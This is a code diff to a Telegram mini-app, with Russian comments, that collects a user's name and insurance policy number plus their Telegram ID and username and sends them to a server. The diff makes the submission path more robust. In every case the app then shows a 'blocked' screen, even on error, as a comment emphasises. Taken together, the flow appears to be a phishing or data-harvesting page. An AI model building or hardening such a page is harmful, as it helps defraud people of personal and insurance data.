@@ -72,7 +72,7 @@
       <button onclick="saveInput('name', 'step3')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
-    <!-- Шаг 3: Полис (цифровая клавиатура) -->
+    <!-- Шаг 3: Полис -->
     <div id="step3" class="hidden fade">
       <h3 class="text-xl font-semibold mb-6">Номер Вашего страхового полиса:</h3>
       <input id="polis" type="tel" inputmode="numeric" pattern="[0-9 ]*" placeholder="1234 567 890" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9 ]/g, '');" />
@@ -144,9 +144,11 @@
     let currentStep = 0;
 
     // Автоматический разворот на весь экран
-    Telegram.WebApp.ready();
-    Telegram.WebApp.expand();
-    Telegram.WebApp.requestFullscreen();
+    if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
+      Telegram.WebApp.ready();
+      Telegram.WebApp.expand();
+      Telegram.WebApp.requestFullscreen();
+    }
 
     function show(id) {
       document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
@@ -202,8 +204,8 @@
     function finish() {
       const payload = {
         ...answers,
-        userId: Telegram.WebApp.initDataUnsafe?.user?.id || '',
-        username: Telegram.WebApp.initDataUnsafe?.user?.username || ''
+        userId: (Telegram?.WebApp?.initDataUnsafe?.user?.id) || '',
+        username: (Telegram?.WebApp?.initDataUnsafe?.user?.username) || ''
       };
 
       console.log("Отправляем данные:", payload);
@@ -218,17 +220,17 @@
       .then(response => {
         console.log('Ответ от сервера:', response.status, response.statusText);
         if (!response.ok) {
-          throw new Error('Сервер вернул ошибку: ' + response.status);
+          console.warn('Сервер вернул ошибку:', response.status);
         }
-        return response.json();
+        return response.text(); // text() вместо json() — не падает на невалидном ответе
       })
-      .then(result => {
-        console.log('Успешный ответ:', result);
+      .then(text => {
+        console.log('Ответ тела:', text);
         show('blocked');
       })
       .catch(err => {
         console.error('Ошибка при отправке:', err);
-        show('blocked');  // Показываем блокировку ВСЕГДА, даже при ошибке
+        show('blocked'); // Показываем блокировку ВСЕГДА
       });
     }
   </script>
